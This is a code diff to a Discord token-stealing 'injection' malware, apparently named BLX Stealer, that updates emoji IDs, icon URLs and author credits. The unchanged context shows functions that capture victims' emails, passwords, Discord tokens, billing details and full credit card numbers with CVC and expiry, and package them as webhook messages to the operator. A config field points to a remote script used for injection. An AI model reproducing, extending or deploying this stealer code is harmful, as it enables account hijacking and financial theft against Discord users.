@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'BLX Stealer | Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg'.replace(/ /g, '%20'), 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/yagiz011/main/main/index.js', 
   /**
@@ -661,16 +661,16 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Hesap Bilgileri**',
-            value: `<:mail:1069997090266173500> Email: **${email}** - <:blacklock:1069101792736051221> Password: **${password}**`,
+            value: `<:mail:1095741024678191114> Email: **${email}** - <:blacklock:1095741022065131571> Password: **${password}**`,
             inline: false,
           },
           {
             name: '**Discord Bilgileri**',
-            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
+            value: `<:blackarrow:1095740975197995041>Nitro Type: **${nitro}**\n<a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: false,
           },
           {
-            name: '<:hackerblack:1069103325200535694> **Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -680,8 +680,8 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'BLX Injection | BasEdemezsiniz ',
-            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
+            text: 'BLX Injection | blx.#2221 ',
+            icon_url: "https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg"
         },
       },
     ],
@@ -713,7 +713,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             inline: true,
           },
           {
-            name: '<:hackerblack:1069103325200535694> **Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -724,7 +724,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         },
         footer: {
             text: 'BLX Injection | BasEdemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
+            icon_url: "https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg"
         },
       },
     ],
@@ -747,16 +747,16 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Değiştirildi**',
-            value: `<:mail:1069997090266173500> New Email: **${email}**\n<:blacklock:1069101792736051221> Password: **${password}**`,
+            value: `<:mail:1095741024678191114> New Email: **${email}**\n<:blacklock:1095741022065131571> Password: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Bilgileri**',
-            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
+            value: `<:blackarrow:1095740975197995041>Nitro Type: **${nitro}**\n<a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1069103325200535694> **Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -766,8 +766,8 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'BLX Injection | BasEdemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
+            text: 'BLX Injection | blx.#2221',
+            icon_url: "https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg"
         },
       },
     ],
@@ -795,11 +795,11 @@ const PaypalAdded = async (token) => {
           },
           {
             name: '**Discord Bilgileri**',
-            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
+            value: `<:blackarrow:1095740975197995041>Nitro Type: **${nitro}**\n<a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1069103325200535694> **Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -809,8 +809,8 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'BLX Injection | BasEdemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
+            text: 'BLX Injection | blx.#2221',
+            icon_url: "https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg"
         },
       },
     ],
@@ -838,11 +838,11 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: '**Discord Bilgileri**',
-            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
+            value: `<:blackarrow:1095740975197995041>Nitro Type: **${nitro}**\n<a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1069103325200535694> **Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -852,8 +852,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'BLX Injection | BasEdemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
+            text: 'BLX Injection | blx.#2221',
+            icon_url: "https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg"
         },
       },
     ],
@@ -883,11 +883,11 @@ const nitroBought = async (token) => {
           },
           {
             name: '**Discord Bilgileri**',
-            value: `<:blackarrow:1069101795827269632>Nitro Type: **${nitro}**\n<a:blackbadge:1069100354312093798> Badges: **${badges}**\n<a:blackmoneycard:1069097362959630337> Billing: **${billing}**`,
+            value: `<:blackarrow:1095740975197995041>Nitro Type: **${nitro}**\n<a:black_hypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '<:hackerblack:1069103325200535694> **Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -897,8 +897,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'BLX Injection | BasEdemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
+            text: 'BLX Injection | blx.#2221',
+            icon_url: "https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg"
         },
       },
     ],
